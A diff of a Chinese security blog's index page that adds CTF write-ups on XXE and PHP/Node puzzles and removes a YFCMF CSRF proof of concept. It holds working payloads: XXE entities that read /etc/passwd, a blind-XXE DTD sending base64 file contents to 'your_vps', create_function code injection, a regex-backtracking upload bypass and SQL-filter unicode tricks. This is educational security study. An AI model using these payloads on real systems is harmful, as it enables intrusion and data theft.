@@ -90,6 +90,303 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
+                    从两道CTF题目学习XXE漏洞 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-07   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
+<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
+<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
+<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
+<p>关于外部实体引用file协议的例子如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
+或者
+&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    %name;
+]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
+<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
+<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
+<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
+<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
+<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
+<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
+<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
+<pre><code>&lt;?php
+  function __autoload($cls) {
+    include $cls;
+  }
+
+  class Black {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  class Green {
+    public function __construct($string, $default, $keyword, $store) {
+      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
+      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
+      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);
+
+      if ($store) {
+            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
+      }
+    }
+  }
+
+  if ($_=@$_GET[&#39;theme&#39;]) {
+    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
+      if (@class_exists($_)) {
+        ($string = @$_GET[&#39;string&#39;]) || $string = false;
+        ($default = @$_GET[&#39;default&#39;]) || $default = false;
+        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;
+
+        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
+      }
+    }
+  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
+    $args = explode(&#39;-&#39;, $_);
+    if (class_exists($args[0])) {
+      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
+    }
+  } else if ($_=@$_GET[&#39;info&#39;]) {
+    phpinfo();
+  }
+
+  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
+<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
+<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
+<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
+<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
+<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
+<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
+<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
+&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;
+
+%send;
+]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
+<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+
+&lt;!DOCTYPE ANY[
+
+&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;
+
+%send;
+%test;
+%back;
+]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+
+&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
+<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
+<p>其中：</p>
+<ul>
+<li>外部实体send引入外部DTD声明</li>
+<li>参数实体test即为“中间参数实体”</li>
+<li>&#37;为了避免编码问题</li>
+<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
+</ul>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
+<ol>
+<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
+</li>
+<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
+</li>
+</ol>
+<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
+<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
+<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
+<p>漏洞点就在后端解析xml。</p>
+<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
+<p>在挖掘漏洞的时候尤其注意两点：</p>
+<ol>
+<li>content-type: application/xml</li>
+<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
+</ol>
+<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
+<li><p>对于PHP，禁止引用外部实体</p>
+<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
+<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
+</li>
+</ol>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
+                    Code-Breaking-Puzzles WriteUp 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-12-21   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
+<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
+<pre><code>&lt;?php
+$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
+$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;
+
+if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
+    show_source(__FILE__);
+} else {
+    $action(&#39;&#39;, $arg);
+}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
+<p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
+<p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
+<p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
+<p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
+<p>别忘了注释//，否则逃脱不了函数</p>
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?php
+function is_php($data){
+    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
+}
+
+if(empty($_FILES)) {
+    die(show_source(__FILE__));
+}
+
+$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
+if (is_php($data)) {
+    echo &quot;bad request&quot;;
+} else {
+    @mkdir($user_dir, 0755);
+    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
+    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);
+
+    header(&quot;Location: $path&quot;, true, 303);
+} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
+<p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
+<h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
+<p>NFA引擎</p>
+<pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
+<pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p>
+<p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
+<p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
+<p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
+<p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
+<pre><code>&lt;?php
+$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);
+$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);
+fwrite($f,$msg);
+fclose($f);</code></pre><p>构造个上传表单完事</p>
+<p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
+<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
+<p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p>
+<p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p>
+<p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p>
+<p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
+<p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
+<h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
+<pre><code>&lt;?php
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
+    eval($_GET[&#39;code&#39;]);
+} else {
+    show_source(__FILE__);
+}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
+<p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
+<p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
+<p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
+<h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p>
+<p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p>
+<p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p>
+<p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p>
+<p>那么select 和 union 都可以绕过</p>
+<p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p>
+<p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p>
+<p>真的是太菜了</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/12/20/SWPUCTF2018 Write up/"> 
                     SWPUCTF2018 Write up 
                 </a>
@@ -281,7 +578,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/20/SWPUCTF2018 Write up/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -329,7 +626,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/17/HCTF2018线下赛感想/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -481,7 +778,7 @@ replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖�
             </div>
             <div class="continue">
             <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -575,7 +872,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/11/13/HCTF题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -613,7 +910,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -888,7 +1185,7 @@ $phar-&gt;stopBuffering();
             </div>
             <div class="continue">
             <a href="/2018/09/13/四个实例递进php反序列化/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1015,7 +1312,7 @@ select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开
             </div>
             <div class="continue">
             <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1079,99 +1376,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
             </div>
             <div class="continue">
             <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/23/Csrf in YFCMF 3.0/"> 
-                    Csrf in YFCMF 3.0 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-23   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
-    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
-        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
-            &lt;option value=&quot;2&quot;/&gt;
-        &lt;/select&gt;
-        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
-    &lt;/form&gt;
-    &lt;script&gt;
-        document.forms[0].submit();
-    &lt;/script&gt;
-&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
-<p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
-<p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/23/Csrf in YFCMF 3.0/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/23/Arbitrary File upload in Semcms V2.7/"> 
-                    Arbitrary File upload in Semcms V2.7 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-23   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>php Background pages restrict the type of uploaded files, jpe, gif, rar,we can break through the restrictions on uploading malicious files such as: PHP.</p>
-<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>The affected code(located:/ciuy_Admin/SEMCMS_Upfile.php):</p>
-<pre><code>$newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)</code></pre><p>We could control the “wname” as we want,and uptype is the suffix which intercepted in allow</p>
-<h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The attaking founction:use char(0) to cut off the filename and make up a renew suffix</p>
